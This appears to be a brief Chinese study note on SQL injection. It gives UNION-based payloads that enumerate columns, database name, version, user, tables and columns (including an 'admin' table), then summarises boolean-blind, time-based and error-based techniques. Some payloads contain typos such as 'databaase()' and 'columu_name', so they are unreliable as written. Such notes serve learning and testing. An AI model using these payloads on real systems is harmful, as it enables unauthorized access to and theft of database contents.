重要前提：union联合注入只适用于有返回结果的sql语句注入
判断有几列

1.id=2 order by num

判断是字符注入还是数值注入

2.id=2’

id=1 union select 1,2,3,4,5

id=1 union select 1,2,database(),version(),user()

输出对应的表名

id=-1 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=databaase()

如果想要把所有表名输出

id=1 union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=databaase()

有表后查对应的列名

id=1 union select 1,2,group_concat(columu_name),4,5 from information_schema.columus where table_name=’admin’

sql的4种方式

sql注入

1.联合注入

联合注入分为两种，一种是数字型联合注入，第二种是字符型联合注入

联合注入不适应的场景

1.过滤union
2.页面不返回查询数据

2.布尔盲注

布尔盲注可以分为两种方式，一种是python进行脚本布尔注入，第二种是sqlmap自动化注入（sqlmap看似是万能的，但是有缺点）

3.延时盲注

原理：无法利用页面显示结果判断sql注入是否成功，此时可以利用sql语句执行的延迟，判断sql是否执行成功
只要可以执行延时，那么就可以利用延时盲注

4.报错注入

顾名思义就是通过报错来获取信息
